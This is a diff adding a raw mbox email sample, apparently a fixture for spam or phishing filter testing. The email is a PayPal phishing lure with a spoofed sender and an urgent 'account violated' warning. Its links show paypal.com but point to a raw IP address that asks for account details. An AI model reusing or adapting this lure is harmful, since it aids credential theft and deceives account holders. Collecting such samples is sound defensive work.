@@ -1,0 +1,112 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 6D8C72A896
+ for <user@example.com>; Tue, 25 Oct 2005 11:04:54 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 64514621C78; Tue, 25 Oct 2005 11:04:54 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id F23A5621C66
+ for <user@example.com>; Tue, 25 Oct 2005 11:04:52 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id LAA15499
+ for user@example.com; Tue, 25 Oct 2005 11:04:50 -0400
+Received: from camelot (mail.cybermill.com [207.230.44.3] (may be forged))
+ by mail.example.com with ESMTP id LAA15491
+ for <user@example.com>; Tue, 25 Oct 2005 11:04:50 -0400
+Received: by camelot (Postfix, from userid 1099)
+ id 0574332BB3B; Tue, 25 Oct 2005 09:45:36 -0500 (CDT)
+To: user@example.com
+Subject: PayPal - Check your account
+From: "support@paypal.com" <support@paypal.com>
+Content-Type: text/html
+Message-Id: <20051025144536.0574332BB3B@camelot>
+Date: Tue, 25 Oct 2005 09:45:36 -0500 (CDT)
+Content-Length: 4322
+Lines: 80
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 211
+
+
+<head><title>PayPal</title>
+<style type="text/css">#obmessage .dummy {}
+#z BODY, #z  TD {font-family: verdana,arial,helvetica,sans-serif;
+font-size:12px;color: #000000;}
+</style>
+</head>
+<span id=z>
+<xhtml>
+<table width=680 align=center>
+        <tr><td><A target="_blank"href="https://www.paypal.com/us"><IMG
+src="http://images.paypal.com/en_US/i/logo/email_logo.gif" alt=PayPal border=0></A></td></tr>
+</table>
+<table width="100%" cellpadding=0>
+        <tr><td background="http://images.paypal.com/images/bg_clk.gif" width=100%><img
+src="http://images.paypal.com/images/pixel.gif"height=29 width=1 border=0></td></tr>
+</table>
+<br>
+<table align=center>
+        <tr>
+        <td width=400>
+        <table>
+                <tr><td>Information Regarding Your account:</td></tr>
+                <tr><td><b>Dear PayPal Member!<br><br>Attention! Your PayPal account has been violated!<br><br>Someone
+with ip address 149.225.126.87 tried to access your personal account!</b><br><br>Please <b>click the link below</b> and
+enter your account information to confirm that you are not currently away. You have 3 days to confirm account
+information or your account will be locked.<br><br>
+                <table width="80%" cellspacing=0 border=0 bgcolor="#FFE65C" align=left>
+                        <tr><td>
+                        <table width="100%" cellpadding=4 bgcolor="#FFFECD" align=center>
+                                <tr><td class="pp_sansserif" align=center><a target="_blank"
+href="http://203.122.32.53/images/.cgi-bin/.webscr/paypal/">Click here to activate your account</a></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                <br><br><BR>You can also confirm your email address by logging into your PayPal account at<a
+target="_blank" href="http://203.122.32.53/images/.cgi-bin/.webscr/paypal/"><br>http://paypal.com/</a>. Click on the "Confirm email" link in
+the Activate Account box and then enter this confirmation number: 1036-8535-4511-9500-3892<br><br>Thank you for using
+PayPal!<br>The PayPal Team
+                </td></tr>
+                <tr><td><hr class=dotted></td></tr>
+                <tr><td>
+                <tr><td class="pp_footer">Please do not reply to this e-mail. Mail sent to this address cannot be
+answered. For assistance,
+            <a href="http://203.122.32.53/images/.cgi-bin/.webscr/paypal/">log in</a> to your PayPal account and choose the "Help" link in the
+footer of any
+page.<br></td></tr><tr><td><img src="http://images.paypal.com/en_US/i/scr/pixel.gif" height=10 width=1
+border=0></td></tr>
+                <tr><td>PayPal Email ID PP059</td></tr>
+        </table>
+        </td>
+        <td width=190 valign=top>
+        <table cellspacing=0 cellpadding=1 bgcolor="#cccccc">
+                <td>
+                <table cellspacing=0 cellpadding=0 bgcolor="#ffffff">
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr><td align=center>Protect Your Account Info</td></tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>Make sure you never provide your password to fraudulent websites.<br><br>To
+safely and securely access the PayPal website or your account, open a new web browser (e.g. Internet Explorer or
+Netscape) and type in the PayPal login page (http://paypal.com/) to be sure you are on the real PayPal
+site.<br><br>PayPal will never ask you to enter your password in an email.<br><br>For more information on protecting
+yourself from fraud, please review our Security Tips at https://www.paypal.com/us/securitytips<br></td></tr>
+                        </table></td></tr>
+                        <tr><td>
+                        <table width="100%" cellpadding=5 bgcolor="#eeeeee">
+                                <tr><td align=center>Protect Your Password</td></tr>
+                        </table>
+                        <table cellpadding=5>
+                                <tr><td>You should never give your PayPal password to anyone.<br></td></tr>
+                        </table>
+                        </td></tr>
+                </table>
+                </td></tr>
+        </table>
+        </td></tr>
+</table>
+</xhtml></span>
